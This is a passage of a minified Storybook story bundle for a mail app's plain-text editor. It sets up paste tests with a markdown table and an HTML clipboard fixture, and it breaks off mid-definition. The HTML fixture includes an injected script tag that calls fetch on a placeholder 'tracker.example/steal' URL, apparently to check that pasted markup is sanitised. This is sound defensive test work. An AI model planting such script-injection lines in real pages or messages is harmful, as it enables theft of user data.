import{j as o,r as w}from"./iframe-uTafckjr.js";import{C as T}from"./rich-text-document-BuK3ZpQ5.js";import{P as C}from"./plain-text-editor-BT7WFsHz.js";import"./preload-helper-PPVm8Dsz.js";import"./cn-BnS_VibS.js";import"./bundle-mjs-DeRmtv56.js";import"./button-DCXIHjmE.js";import"./purify.es-2FREwzWT.js";import"./banner-Hh0xdm4p.js";import"./x-DS_pud-s.js";import"./createLucideIcon-DLYy-DY-.js";const{expect:n,fn:P,userEvent:E}=__STORYBOOK_MODULE_TEST__,b=["| Region | Total |","| --- | --- |","| EMEA | 412 |","| Americas | 388 |"].join(`
`),f=['<meta charset="utf-8">',"<style>.hdr{color:#c00}</style>",'<h2 class="hdr" style="color:#c00">Quarterly numbers</h2>',"<p>Highlights <strong>this quarter</strong>:</p>","<table><thead><tr><th>Region</th><th>Total</th></tr></thead>","<tbody><tr><td>EMEA</td><td>412</td></tr></tbody></table>",'<script>fetch("https://tracker.example/steal")<\/script>'].join(""),y="Quarterly numbers Highlights this quarter:",S=({initial:e="",onSubmit:t})=>{const[a,r]=w.useState(e),[d,v]=w.useState("plain");return o.jsx(C,{value:a,onChange:r,onSubmit:t,trailing:o.jsx(T,{mode:d,onToggle:()=>v(d==="plain"?"rich":"plain")})})},D={title:"Mail/PlainTextEditor",component:S,parameters:{layout:"centered"},decorators:[e=>o.jsx("div",{"data-testid":"body-area",className:"flex h-[420px] w-[640px] flex-col overflow-auto rounded-md border border-line bg-canvas",children:o.jsx(e,{})})]},x=async(e,t)=>{const a=e.querySelector("[data-testid=compose-body-plain]");if(!a)throw new Error("the plain surface is not mounted");a.focus();const r=new DataTransfer;return t.html!==void 0&&r.setData("text/html",t.html),t.text!==void 0&&r.setData("text/plain",t.text),a.dispatchEvent(new ClipboardEvent("paste",{bubbles:!0,cancelable:!0,clipboardData:r})),a},m={name:"Empty"},p={name:"A written note",args:{initial:`Thanks — that works for me.
